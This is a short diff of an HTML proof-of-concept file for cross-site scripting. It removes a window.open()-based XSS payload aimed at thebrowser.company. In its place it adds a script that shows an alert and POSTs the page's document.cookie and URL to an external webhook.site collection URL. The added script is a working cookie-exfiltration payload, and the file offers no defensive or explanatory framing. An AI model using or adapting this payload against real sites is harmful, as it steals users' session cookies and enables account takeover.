@@ -1,20 +1,13 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>XSS PoC via window.open()</title>
-  <script>
-    function triggerXSS() {
-      const payload = encodeURIComponent(`<img src=x onerror=alert('🔥 DOM XSS via window.open ✅')>`);
-      const url = `https://thebrowser.company/?x=${payload}`;
-      window.open(url, '_blank');
-    }
-  </script>
-</head>
 <body>
-  <h2>🔥 PoC: DOM XSS using <code>window.open()</code></h2>
-  <p>Click below to launch the XSS in a new tab:</p>
-  <button onclick="triggerXSS()">💥 Launch XSS</button>
+  <script>
+    alert("🔥 XSS - الأساطبر وصل 🔥");
+    // أو استخراج بيانات
+    fetch("	https://webhook.site/ec601f90-3768-46ba-a151-110e3a9e7e74", {
+      method: "POST",
+      body: JSON.stringify({
+        cookies: document.cookie,
+        location: location.href
+      })
+    });
+  </script>
 </body>
-</html>
-
-
